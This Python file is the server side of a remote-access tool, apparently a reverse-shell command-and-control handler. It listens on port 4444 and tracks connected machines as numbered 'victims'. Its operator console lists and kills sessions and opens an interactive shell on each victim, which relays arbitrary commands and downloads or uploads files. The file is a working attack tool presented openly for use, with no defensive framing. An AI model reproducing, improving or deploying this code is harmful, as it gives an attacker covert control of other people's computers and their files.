import socket
import threading
import sys
import time
import os
import utils

class InteractVictim():

    def __init__(self, victim_id:int, victim_connection:socket.socket):

        self.id = victim_id
        self.conn = victim_connection

    def _victim_help(self):
        """Displays available command that can be run on a victim."""

        victim_cmd = {
            "help\t": "Print this help menu.",
            "back\t": "Return to the console(background to current connection).",
            "download": "Download a file.",
            "upload\t": "Upload a file to server.",
            "!cmd\t": "Run command in the host.",
            "    \t": "All default commands of the victim OS."
        }

        print("[+] Help menu.\n")
        print("Command\t\tDescription")

        for cmd in victim_cmd:
            print(f"{cmd}\t{victim_cmd.get(cmd)}")

    def victim_console(self) -> None:
    
        while self.conn:
        
            command = (input(f"{self.id}-> ").strip(' '))

            if "help" == command:
                self._victim_help()

            elif "back" == command:
                break

            elif "!" == command[:1]:
                
                output = utils._exec_command(command[1:])

                if output:
                    print(output)

            elif "download" == command[:8]:

                utils._send(self.conn, command)

                file_name = command[9:]

                print(f"[+] Downloading {file_name}...")
                file_data = utils._receive(self.conn)

                utils._write_file(file_name, file_data)

            elif "upload" == command[:6]:

                cmds = command.split(' ')

                file_name = os.path.abspath(cmds[1]) # path of the file in the server

                if utils._does_file_exists(file_name):

                    print(f"[+] Uploading {file_name}...")

                    utils._send(self.conn, command)
                    utils._send_file(self.conn, file_name)

                else:
                    print(f"[!] File, {file_name} does not exists.")
                    continue


            else:
                utils._send(self.conn, command)
        
                receive_data = utils._receive(self.conn)
            
                if not receive_data:
                    continue
    
                else:
                    print(receive_data)
        return

class Server():

    def __init__(self, ip:str, port:int):
        self.ip = ip
        self.port = port
        self.is_server_on = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.victims_dict = {} # Stores conn of the victim(s)
        self.victims_id = 0

    def _accept_connection(self) -> None:
        """Adds conn, addr to connected_client dict."""

        while self.is_server_on:

            try:
                conn, addr = self.sock.accept()
                self.victims_id += 1
                print(f"Got connection from {addr}")

                self.victims_dict.update({self.victims_id: conn})

            except Exception as e:
                print(e)

            # alive_que = utils._receive(conn)
            
            # if b'PING' == alive_que:
            #     utils._send(conn, b'PONG')
                

    def _close_connection(self, victim_id:int) -> None:

        conn:socket.socket = self.victims_dict.get(victim_id)

        try:
            print(f"[+] Closing connection with {conn}")

            utils._send(conn, "kill yourself")
            time.sleep(0.5)
            conn.close()

            self.victims_id -= 1
            self.victims_dict.pop(victim_id)

        except Exception as e:
            print(f"[!] Error occurred: {e}")
            return

    def _console_help(self):
        """Displays available command that can be run on the console"""

        console_cmd = {
            "help\t": "Print this help menu.",
            "exit\t": "Exit the program(doesn't kill existance connection).",
            "kill\t": "Kill a connection from ID.",
            "jobs\t": "To see connected victims.",
            "interact": "Interact with one of the victim.",
            "!cmd\t" : "Run terminal command in the host.",
        }

        print("[+] Help menu.")
        print("Command\t\tDescription")

        for cmd in console_cmd:
            print(f"{cmd}\t{console_cmd.get(cmd)}")

    def _victim_exists(self, id:int) -> bool:
        """Takes victim id to check if it exists or not. Returns True if victim exists, else False."""

        if id not in self.victims_dict.keys():
            return False

        return True

    def _list_victims(self):
        """Lists all available connection."""

        print(f"[+] Total {self.victims_id} victims...")
        print("ID\tVictim")

        for id in self.victims_dict:
            print(f"{id}\t{self.victims_dict.get(id)}")

    def console(self):
        """Provides an interactive console to work with."""

        while self.is_server_on:

            try:
                cmd = input("--> ").lower().strip(' ')

                if not cmd:
                    continue

                elif "help" == cmd:
                    self._console_help()

                elif cmd.startswith("!"):
                    cmd_output = utils._exec_command(cmd[1:])

                    if cmd_output:
                        print(cmd_output)
    
                elif "exit" == cmd:
                    self.is_server_on = False
    
                    # Close a specific connection
                elif cmd.startswith("kill"):
                    id = int(cmd[4:].strip(' '))

                    if not self._victim_exists(id):
                        print("[!] Failed to kill victim.")
                        print(f"[!] No victim associated with ID, {id}.")
                        continue

                    self._close_connection(id)
    
                elif "jobs" == cmd:
                    self._list_victims()
    
                elif "interact" ==cmd[:8]:
                    id = int(cmd[8:])

                    if not self._victim_exists(id):
                        print("[!] Failed interact with victim.")
                        print(f"[!] Victim with ID {id} does not exists.\n")
                        continue
                    
                    if utils._is_alive(self.victims_dict.get(id)):
                        victim_console = InteractVictim(id, self.victims_dict.get(id))
                        victim_console.victim_console()
                        
                    else:
                        print("[!] Connection with victim is broken.")
                        self._close_connection(id)
                    

    
                else:
                    print("[-] Please enter a valid command\n")
    
    
            except KeyboardInterrupt:
                print("[+] type 'exit' to exit.\n")
    
            except Exception as e:
                print(e)

    def start_server(self):

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.ip, self.port))
        self.sock.listen(0)
        print(f"[+] Server listening on {self.ip}:{self.port}...")

    def main(self):
        
        print("[+] Starting server...")

        try:
            self.start_server()
            self.is_server_on = True
        except Exception as e:
            print(f"[!] {e}")
            sys.exit(1)

        if not self.is_server_on:
            print("[!] Failed to start the server...")

        try:
            print("[+] Waiting for victim to connect...")
            a_t = threading.Thread(target=self._accept_connection, daemon=True)
            a_t.start()
        except Exception as e:
            print(f"[!] {e}")

        try:
            print("[+] Type 'help' for menu.")
            c_t = threading.Thread(target=self.console)
            c_t.start()
        except Exception as e:
            print(f"[!] {e}")


if __name__ == "__main__":
    server = Server("127.0.0.1", 4444)
    server.main()